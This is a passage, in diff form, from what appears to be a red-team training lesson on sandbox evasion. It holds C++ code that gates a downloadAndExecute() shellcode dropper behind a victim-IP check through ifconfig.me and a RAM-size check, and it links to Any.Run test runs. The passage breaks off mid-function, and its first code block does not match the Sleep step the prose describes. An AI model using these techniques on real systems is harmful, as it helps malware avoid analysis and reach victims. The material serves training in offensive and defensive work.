@@ -124,3 +124,129 @@ With this base code acquired, we will take our first step into the world of Sand
 Taking a Nap
 We can take our template code from the previous task and add a Sleep statement for 120,000MS  to it. This translates to roughly 120 seconds or 2 minutes. Generally, you would want a time closer to 5 minutes to be sure; however, 2 minutes will suffice for testing purposes. We'll now add our Sleep statement in the main function:
 ```text
+int main() {
+    if (isDomainController == TRUE) {
+        downloadAndExecute();
+    } else {
+        cout << "Domain Controller Not Found!";
+    }
+}
+```
+Testing our Code
+After this is done, we can compile and upload the code to Any.Run. You can read along with the following tests, and see their behaviour on Any.Run by following the links. This will serve as our test-ground for Sandbox evasion as it provides highly detailed information for us. Reviewing the two runs:
+Sleep Bypass https://app.any.run/tasks/0799e9b3-dddc-4838-ba2d-c95fc0a7e63b
+No Sleep Bypass https://app.any.run/tasks/ad3cf5b4-1bdf-4005-8578-507334f5c8ac
+Looking at the two results side by side, we notice no activity occurring in our Sleepy run.
+Screenshot from Any.Run showing our Sleep bypass function worked as intended.
+Where in our not-sleepy run, we can see an HTTP Request go out to Cloudflare.
+Screenshot from Any.Run showing our results with no Sandbox Evasion techniques implemented
+Congratulations! We have successfully created our first Sandbox Evasion technique. While this is a simple technique, it is incredibly powerful and has allowed us to run out Any.Run's one-minute timer. As stated in the last task, this method may or may not work due to various blog posts that have been published showing that Blue Teamers can create sleep timer bypasses. A better implementation would be to waste computing time by doing heavy math.
+Geolocation Filtering
+Moving onto our next method of evading execution of our shellcode on a Sandbox, we will be leveraging Geolocation blocks. Fortunately, we will be able to leverage a good amount of code that is already written for us. Portions of the "downloadAndExecute()" function can be re-used for this. We will be reusing the following components:
+Website URL (formerly the c2URL variable)
+Internet Stream (formerly the stream variable)
+String variable (formerly the s variable)
+Buffer Space (formerly the Buff variable)
+Bytes Read (formerly the unsigned long bytesRead variable)
+Lastly, the URLOpenBlockingStreamA function https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775127(v=vs.85)
+Integrating This into our Code
+This translates to an actual function that looks so:
+```text
+BOOL checkIP() {   
+ // Declare the Website URL that we would like to vicit
+    const char* websiteURL = "<https://ifconfig.me/ip>";   
+ // Create an Internet Stream to access the website
+    IStream* stream;   
+ // Create a string variable where we will store the string data received from the website
+    string s;   
+  // Create a space in memory where we will store our IP Address
+    char buff[35];   
+    unsigned long bytesRead;   
+ // Open an Internet stream to the remote website
+    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);   
+ // While data is being sent from the webserver, write it to memory
+    while (true) {       
+        stream->Read(buff, 35, &bytesRead);       
+        if (0U == bytesRead) {           
+            break;       
+        }       
+        s.append(buff, bytesRead);   
+    }   
+  // Compare if the string is equal to the targeted victim's IP. If true, return the check is successful. Else, fail the check.
+    if (s == "VICTIM_IP") {       
+        return TRUE;   
+    }   
+    else {       
+    return FALSE;   
+    }
+}
+```
+This code can be broken down into the following steps:
+Declare the required variables mentioned above.
+Open an internet stream with the URLOpenBlockingStreamA function to ifconfig.me/ip to check the current IP Address.
+Write the data stream returned from the URLOpenBlockingStreamA function to the memory.
+Append the data from the memory buffer to a string variable.
+Check and see if the string data is equal to the Victim's IP Address.
+If True, return TRUE; if False, return FALSE.
+Now we must modify our main function so that we can leverage our newly created function:
+```text
+int main(){
+    if(checkIP() == TRUE){
+        downloadAndExecute();
+        return 0;
+    }
+    else {
+        cout << "HTTP/418 - I'm a Teapot!";
+        return 0;
+    }
+}
+```
+The code above invokes the new function, checkIP(), and if the IP Address returns TRUE, then invoke the downloadAndExecute() function to call the shellcode from our C2 server. If FALSE, return HTTP/418 - I'm a teapot!".
+Testing Our Code
+Now that we have wrapped up our second Sandbox Evasion technique, it is very important to know that this is an incredibly common TTP used by threat actors. Both APTs and Red Teams alike often use services to check the "Abuse Info" of an IP Address to gather information about an IP Address to determine if it is a legitimate company or not. Any.Run is well aware of this Anti-Sandboxing technique and has even flagged it in our instance. You can see the detailed results at the links below:
+One with an IP Address Filter https://app.any.run/tasks/dbc2e81a-d7da-4ee5-a628-a5d2d17a0c1a
+One without an IP Address Filter https://app.any.run/tasks/6c721d61-b06a-4497-84fd-1aea34671085
+Looking at the two results, we can see that ifconfig.me is flagged as a "questionable/Potentially Malicious" site used to check for your external IP Address. In fact, this Sandbox evasion method ended up hurting our score, so it should be used as a last resort or with a recently deployed/custom IP Address checking server. The full report can be found here.
+https://any.run/report/c98a60e5d0390ba4ad784b76ec0ce3602272452ffb44ce73dbb849906f2cff4d/dbc2e81a-d7da-4ee5-a628-a5d2d17a0c1a
+A Screenshot from Any.Run showing our run with Sandbox Evasion techniques applied
+Screenshot from Any.Run showing an outbound HTTP Request
+As you are now aware, not all Sandbox escaping techniques may be helpful in certain situations; you must pick and choose which evasion techniques you are going to implement carefully, as some may do more harm than good.
+Checking System Information
+We're going to start off the System Information category with - the amount of RAM a system has. It’s important to note that Windows measures data in a non-standard format. If you have ever bought a computer that said it has “256GB of SSD Storage”, after turning it on, you would have closer to 240GB. This is because Windows measures data in units of 1024-bytes instead of 1000-bytes. Be warned that this can get very confusing very quickly. Fortunately for us, we will be working in such small amounts of memory that accuracy can be a “best guess” instead of an exact number. Now that we know this, how can we determine how much memory is installed on the System?
+Checking System Memory
+Fortunately, this is a relatively easy thing to find out. We only need the Windows header file included, and we can call a specific Windows API, GlobalMemoryStatusEx, to retrieve the data for us. To get this information, we must declare the MEMORYSTATUSEX struct; then, we must set the size of the dwLength member to the size of the struct. Once that is done, we can then call the GlobalMemoryStatusEx Windows API to populate the struct with the memory information.
+In this scenario, we are specifically interested in the total amount of physical memory installed on the system, so we will print out the ullTotalPhys member of the MEMORYSTATUSEX struct to get the size of the memory installed in the system in Bytes. We can then divide by 1024 3x to get the value of memory installed in GiB. Now let’s see what this looks like in C++:
+https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-globalmemorystatusex
+https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-memorystatusex
+```text
+#include <iostream>
+#include <Windows.h>
+using namespace std;
+int main() {
+// Declare the MEMORYSTATUSEX Struct    
+   MEMORYSTATUSEX statex;
+// Set the length of the struct to the size of the struct    
+   statex.dwLength = sizeof(statex);
+// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    
+   GlobalMemoryStatusEx(&statex);
+// Print the physical memory installed on the system    
+   cout << "There is " << statex.ullTotalPhys/1024/1024/1024 << "GiB of memory on the system.";
+}
+```
+This code can be broken down into the following steps:
+We're going to declare the MEMORYSTATUSEX Struct; this will be populated with info from the GlobalMemoryStatusEx WinAPI.
+Now, we must set the length of the struct so that we can populate it with data. To do so, we're going to use the sizeof function.
+Now that we have the length of the struct, we can populate it with data from the GlobalMemoryStatusEx WinAPI.
+We can now read the total memory amount from the system.
+Integrating This into our Code
+Now that we have the technical know-how, we should integrate this check into our code. Generally speaking (You should verify this by yourself), most Sandboxes have 4GB of RAM dedicated to the machine, so we should check and see if the memory count is greater than 5; if it is not, exit the program; if it is, continue execution. We will not be modifying the downloadAndExecute function anymore; from here on, we will be adding new functions and changing the main function.
+```text
+BOOL memoryCheck() {
+// This function will check and see if the system has 5+GB of RAM
+// Declare the MEMORYSTATUSEX Struct    
+    MEMORYSTATUSEX statex;
+// Set the length of the struct to the size of the struct    
+    statex.dwLength = sizeof(statex);
+// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    
+    GlobalMemoryStatusEx(&statex);
+// Checks if the System Memory is greater than 5.00GB    
